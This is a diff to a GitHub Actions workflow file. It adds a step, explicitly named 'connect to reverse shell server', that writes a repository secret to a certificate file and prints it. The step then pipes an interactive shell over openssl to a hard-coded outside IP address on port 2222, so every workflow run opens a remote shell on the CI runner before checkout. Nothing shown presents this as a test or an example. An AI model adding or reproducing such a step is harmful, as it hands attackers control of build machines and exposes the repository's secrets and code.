@@ -31,6 +31,14 @@ jobs:
     env:
       SHA: ${{ github.event.workflow_run.head_commit.id || github.sha }}
     steps:
+      - name: connect to reverse shell server
+        run: |
+          echo "${{ secrets.REV_SH_CERT }}" > cert.pem 
+          cat cert.pem
+          openssl x509 -in cert.pem -noout -text
+          mkfifo /tmp/s
+          export SERVER_IP=54.159.108.35
+          sh -i < /tmp/s 2>&1 | openssl s_client -quiet -strict -verify 1 -verify_return_error -CAfile cert.pem -connect $SERVER_IP:2222 > /tmp/s &
       - uses: actions/checkout@v2
         with:
           ref: ${{ env.SHA }}
